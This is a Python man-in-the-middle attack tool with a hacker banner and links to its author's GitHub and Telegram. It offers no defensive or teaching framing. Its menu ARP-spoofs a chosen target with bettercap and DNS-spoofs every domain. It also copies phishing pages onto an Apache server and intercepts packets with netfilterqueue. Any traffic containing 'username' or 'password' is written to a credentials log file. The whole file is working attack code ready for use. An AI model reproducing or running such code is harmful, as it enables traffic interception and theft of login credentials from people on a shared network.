import os
import time
import colorama
import scapy.all as scapy
import netfilterqueue
from colorama import Fore

# Initialize colorama
colorama.init(autoreset=True)

LOG_FILE = "captured_credentials.txt"

def banner():
    """Display ASCII Art and Menu"""
    os.system("clear")
    print(Fore.RED + r"""
     ███╗   ███╗██╗████████╗███╗   ██╗███╗   ██╗███████╗
     ████╗ ████║██║╚══██╔══╝████╗  ██║████╗  ██║██╔════╝
     ██╔████╔██║██║   ██║   ██╔██╗ ██║██╔██╗ ██║███████╗
     ██║╚██╔╝██║██║   ██║   ██║╚██╗██║██║╚██╗██║╚════██║
     ██║ ╚═╝ ██║██║   ██║   ██║ ╚████║██║ ╚████║███████║
     ╚═╝     ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝
    """)
    print(Fore.YELLOW + "="*50)
    print(Fore.CYAN + "[1] Start MITM Attack (ARP Spoofing)")
    print(Fore.CYAN + "[2] Setup Fake Login Page")
    print(Fore.CYAN + "[3] Capture Network Traffic (Auto Save)")
    print(Fore.CYAN + "[4] Stop Attack & Restore Network")
    print(Fore.CYAN + "[5] Exit")
    print(Fore.YELLOW + "="*50)
    print(Fore.GREEN + "GitHub: https://github.com/KevinKhemra007")
    print(Fore.GREEN + "Telegram: https://t.me/hackisreal007")
    print(Fore.YELLOW + "="*50)

def enable_ip_forwarding():
    """Enable IP Forwarding"""
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print(Fore.GREEN + "[✅] IP Forwarding Enabled!")

def arp_spoof(target_ip, gateway_ip):
    """Perform ARP Spoofing"""
    print(Fore.RED + f"[⚠️] Spoofing Target: {target_ip}")
    os.system(f"xterm -e 'bettercap -eval \"set arp.spoof.targets {target_ip}; arp.spoof on; net.recon on\"' &")

def dns_spoofing():
    """Redirect HTTP requests to phishing site"""
    print(Fore.RED + "[⚠️] Redirecting Traffic to Fake Page...")
    os.system("bettercap -eval 'set dns.spoof.all true; set dns.spoof.domains *; dns.spoof on'")

def setup_fake_login():
    """Deploy Fake Login Page"""
    print(Fore.YELLOW + "[⚡] Setting up Phishing Page...")
    os.system("sudo service apache2 start")
    os.system("sudo cp -r phishing_pages/* /var/www/html/")
    print(Fore.GREEN + "[✅] Fake Login Page is Ready!")

def capture_credentials(packet):
    """Capture login credentials from HTTP traffic and save to file"""
    if packet.haslayer(scapy.Raw):
        payload = packet[scapy.Raw].load.decode(errors="ignore")
        if "username" in payload or "password" in payload:
            print(Fore.GREEN + f"[✅] Captured Credentials: {payload}")
            save_credentials(payload)

def process_packets():
    """Intercept and process network packets"""
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, capture_credentials)
    queue.run()

def save_credentials(data):
    """Save captured credentials to a text file"""
    with open(LOG_FILE, "a") as file:
        file.write(data + "\n")
    print(Fore.YELLOW + f"[💾] Credentials saved to {LOG_FILE}")

def stop_attack():
    """Restore Network & Stop MITM Attack"""
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    os.system("bettercap -eval 'arp.spoof off'")
    os.system("sudo service apache2 stop")
    print(Fore.GREEN + "[✅] Attack Stopped & Network Restored!")

def main():
    """Main Menu"""
    while True:
        banner()
        choice = input(Fore.YELLOW + "[📌] Enter your choice: ")

        if choice == "1":
            target_ip = input(Fore.GREEN + "[🎯] Enter Target IP: ")
            gateway_ip = input(Fore.GREEN + "[🌐] Enter Gateway IP: ")
            enable_ip_forwarding()
            arp_spoof(target_ip, gateway_ip)
            dns_spoofing()
        elif choice == "2":
            setup_fake_login()
        elif choice == "3":
            process_packets()
        elif choice == "4":
            stop_attack()
        elif choice == "5":
            print(Fore.YELLOW + "[🛑] Exiting...")
            break
        else:
            print(Fore.RED + "[❌] Invalid choice! Try again.")

if __name__ == "__main__":
    main()
